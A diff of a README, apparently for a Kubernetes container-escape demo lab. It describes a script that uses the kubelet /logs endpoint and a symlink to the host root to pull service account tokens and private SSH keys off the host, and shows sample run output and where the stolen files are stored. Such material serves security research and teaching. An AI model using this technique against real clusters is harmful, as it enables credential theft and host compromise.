@@ -45,8 +45,8 @@ $ kubectl exec -it escaper bash
 ```
 
 ## Extract Sensitive Data
-Inside the `~/exploit` folder, there's a python script, which locates and downloads private key files from the host, as well as kubernetes service account tokens.
-(to find tokens,the script searches the /var/lib/kubelet/pods folder. this way it can read the mounted token files for each pod that runs on the host)
+In addition to the given lsh and cath commands, Inside the `~/exploit` folder, there's a python script, which automatically locates and downloads private key files from the host, as well as kubernetes service account tokens.  
+_(to find tokens, the script searches the /var/lib/kubelet/pods folder. this way it can read the mounted .token files for each pod that runs on the host)_
 
 ## Run the script
 ```bash
@@ -55,15 +55,10 @@ $ kubectl exec -it escaper bash
 [*] Got access to kubelet /logs endpoint
 [+] creating symlink to host root folder inside /var/log
 [*] fetching token files from host
-[*] downloaded: /var/lib/kubelet/pods/6d67bed2-abe3-11e9-9888-42010a8e020e/volumes/kubernetes.io~secret/aqua-token-blkpc/token
-...
+[+] extracted hostfile: /var/lib/kubelet/pods/6d67bed2-abe3-11e9-9888-42010a8e020e/volumes/kubernetes.io~secret/metadata-agent-token-xjfh9/token
+[*] fetching private key files from host
+[+] extracted hostfile: /home/ubuntu/.ssh/private.key
 ```
-
-The steps of the exploit:
-* Deciding whether it can run
-* Discovering relevant mac/ip addresses
-* ARP spoofing the bridge (and kube-dns in case of direct attack mode)
-* DNS proxy requests, and spoofing relevant entries
-* Restoring all network on CTRL+C interrupt
-
+Token Files are downloaded to: `/root/exploit/host_files/tokens`  
+Key Files are downloaded to: `/root/exploit/host_files/private_keys`
 
